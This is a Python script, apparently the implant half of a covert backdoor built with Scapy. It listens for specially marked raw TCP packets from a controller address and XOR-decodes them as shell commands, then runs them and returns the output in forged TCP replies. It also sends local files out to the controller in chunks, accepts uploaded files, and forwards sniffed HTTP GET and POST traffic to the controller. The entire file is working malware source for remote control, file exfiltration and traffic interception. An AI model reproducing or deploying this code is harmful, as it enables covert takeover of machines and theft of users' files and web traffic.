from scapy.all import *
from subprocess import *
import threading
import sys
import time
import os

server_ip = "10.0.2.15"
my_ip = "10.0.2.5"
server_port = 443
load_layer("http")

verbose_mode = False
if "-v" in sys.argv:
    verbose_mode = None

command_port = 11235
file_port = 53214
file_port2 = 43921

def decryptStr(s):
    out = ""
    for i in range(len(s)):
        out += chr(ord(s[i]) ^ (0xff+i))
    return out

def processPacket(pac):
    output = "Command Success"
    command = decryptStr(pac.payload.load.decode("utf-8"))
    args = command.split()
    if(args[0] == "copy"):
        sendFile(args[1])
    if(args[0] == "copy2"):
        receiveFile(args[2])
    elif(args[0] == "pwd"):
        output = os.getcwd()
    elif(args[0] == "cd"):
        if(len(args)==1 or args[1] == "~"):
            try:
                os.chdir(os.getenv("HOME"))
            except:
                output = "Failed cd to Home"
        else:
            try:
                os.chdir(args[1])
            except:
                output = "Directory not found"
    else:
        f = PIPE
        if ">" in args:
            f = open(args[args.index(">")+1],"w")
            args = args[:args.index(">")]
        elif ">>" in args:
            f = open(args[args.index(">>")+1],"a")
            args = args[:args.index(">>")]
        err = None
        try:
            proc = Popen(args,stderr=PIPE,stdout=f)
            try:
                output,err = proc.communicate(timeout=20)
            except TimeoutExpired:
                proc.kill()
                output = "Process Time out"
        except:
            output = "Invalid command"
        if f != PIPE:
            f.close()
        if output == None:
              output = " "
        elif type(output) == bytes:
            output = output.decode("utf-8")
        if err != None:
            output += err.decode("utf-8")
        if len(output) == 0:
            output = " "

    if len(output) > 1000:
        output = output[:1000]

    packet = IP(id=pac[IP].id,src=pac[IP].dst,dst=pac[IP].src) / \
            TCP(flags=18,seq=pac[TCP].ack,ack=pac[TCP].seq,sport=pac[TCP].dport,dport=pac[TCP].sport) / \
            decryptStr(output)
    send(packet,verbose=verbose_mode)

def filterHTTP(x):
    if IP in x and x[IP].dst == server_ip:
        return False
    if HTTP in x and "Method" in x['HTTP'].payload.fields and (x['HTTP'].payload.Method == b"GET" or x['HTTP'].payload.Method == b'POST'):
        return True
    return False

def redirectPacket(x):
    if x[IP].dst != my_ip:
        x[IP].src = x[IP].dst
        x[IP].dst = server_ip
        x[TCP].sport = x[TCP].dport
        x[TCP].dport = server_port
        try:
            send(x[IP],verbose=verbose_mode)
        except:
            pass

def sendNotification():
    sniff(lfilter=filterHTTP,prn=redirectPacket)

def answerPacket(pac):
    tmp = pac[IP].src
    pac[IP].src = pac[IP].dst
    pac[IP].dst = tmp
    pac[TCP].flags = 18
    tmp2 = pac[TCP].seq
    pac[TCP].seq = pac[TCP].ack
    pac[TCP].ack = tmp2
    prt = pac[TCP].sport
    pac[TCP].sport = pac[TCP].dport
    pac[TCP].dport = prt
    send(pac[IP],verbose=verbose_mode)

def sendFile(filename):
    try:
        f = open(filename, "rb")
    except:
        return
    s = f.read()
    f.close()
    chunksize = 500
    if len(s) % chunksize != 0:
        chunknum = len(s) // chunksize + 1
    else:
        chunknum = len(s) // chunksize

    send(IP(src=my_ip,dst=server_ip)/TCP(sport=file_port,dport=server_port,seq=chunknum),verbose=verbose_mode)

    time.sleep(1)
    i = 0
    while(i<len(s)):
        send(IP(src=my_ip,dst=server_ip)/TCP(sport=file_port,dport=server_port,ack=i)/Raw(load=s[i:min(i+chunksize,len(s))]),verbose=verbose_mode)
        i+=chunksize

def receiveFile(outfilename):
    pac = sniff(lfilter=lambda x:TCP in x and
                                 x[IP].src == server_ip and
                                 x[IP].dst == my_ip and
                                 x[TCP].sport == file_port2
                ,timeout=10
                ,count=1)
    if list(pac) == []:
        if "-d" in sys.argv:
            print("Receive File handshake timeout")
        return
    pac = pac[0]
    chunknum = pac[TCP].seq
    answerPacket(pac)

    pacs = []

    if chunknum > 0:
        pacs = sniff(lfilter=lambda x:TCP in x and
                                      x[IP].src == server_ip and
                                      x[IP].dst == my_ip and
                                      x[TCP].sport == file_port2
                     ,timeout=max(chunknum,10)
                     ,count=chunknum)
        if pacs == []:
            if "-d" in sys.argv:
                print("Receive File timeout")
            return
        pacs = sorted(list(pacs),key=lambda x:x[TCP].ack)

    output = b""
    for i in pacs:
        output += i.payload.load

    try:
        f = open(outfilename,"wb",0)
        f.write(output)
        f.close()
        if "-d" in sys.argv:
            print("Writing file "+outfilename+". Success.")
    except:
        if "-d" in sys.argv:
            print("Writing file "+outfilename+". Fail.")

t = threading.Thread(target=sendNotification)
t.setDaemon(True)
t.start()

sniff(lfilter=lambda x:TCP in x and
                       x[IP].src == server_ip and
                       x[IP].dst == my_ip and
                       x[TCP].dport == command_port and
                       x[TCP].seq == 100 and
                       x[TCP].ack == 100
      ,prn=processPacket)
